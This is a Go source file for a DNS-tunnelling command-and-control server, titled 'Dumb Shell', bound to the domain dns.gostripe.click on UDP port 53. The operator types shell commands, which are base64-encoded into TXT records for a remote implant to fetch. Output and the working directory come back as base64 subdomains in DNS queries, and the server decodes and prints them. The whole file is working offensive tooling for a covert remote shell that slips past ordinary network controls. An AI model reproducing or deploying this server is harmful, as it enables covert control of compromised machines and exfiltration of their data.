package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"
)

var linecache []string
var currentDir string
var curcmd string

var records = map[string]string{}

func parseQuery(m *dns.Msg) {
	for _, q := range m.Question {
		switch q.Qtype {
		case dns.TypeA:
			if !lineCacheCheck(base64Encode(q.Name)) {
				sub := strings.Split(q.Name, ".")
				if sub[1] == "working" {
					currentDir = base64Decode(sub[0] + "==")
				} else if sub[1] == "current" {
					curcmd = sub[0]
				} else {
					fmt.Print(base64Decode(sub[0] + "=="))
					ip := records[q.Name]
					if ip != "" {
						rr, err := dns.NewRR(fmt.Sprintf("%s A %s", q.Name, ip))
						if err == nil {
							m.Answer = append(m.Answer, rr)
						}
					}
					lineCache(base64Encode(q.Name))
				}
			}
		case dns.TypeTXT:
			ip := records[q.Name]
			if ip != "" {
				rr, err := dns.NewRR(fmt.Sprintf("%s TXT %s", q.Name, ip))
				if err == nil {
					m.Answer = append(m.Answer, rr)
				}
			}
		}
	}
}

func handleDnsRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Compress = true

	switch r.Opcode {
	case dns.OpcodeQuery:
		parseQuery(m)
	}

	w.WriteMsg(m)
}

func reader() {

	reader := bufio.NewReader(os.Stdin)
	fmt.Println("Dumb Shell")
	fmt.Println("---------------------")

	for {
		fmt.Print("\n" + currentDir + "$ ")
		text, _ := reader.ReadString('\n')
		text = strings.Replace(text, "\n", "", -1)
		rand.Seed(time.Now().UnixNano())

		test := base64Encode(text) + ":" + randSeq(10)
		addTXTRecord(test)
	}

}

func base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func base64Decode(str string) string {
	data, _ := base64.StdEncoding.DecodeString(str)
	return string(data)
}

func main() {
	go reader()
	// attach request handler func
	dns.HandleFunc("dns.gostripe.click.", handleDnsRequest)

	// start server
	port := 53
	server := &dns.Server{Addr: ":" + strconv.Itoa(port), Net: "udp"}
	log.Printf("Starting at %d\n", port)
	err := server.ListenAndServe()
	defer server.Shutdown()
	if err != nil {
		log.Fatalf("Failed to start server: %s\n ", err.Error())
	}

}

func addTXTRecord(r string) {
	records[curcmd+".cmd.dns.gostripe.click."] = r
}

func lineCache(line string) {

	linecache = append(linecache, line)
}

func lineCacheCheck(cmd string) bool {
	return contains(linecache, cmd)
}

func contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
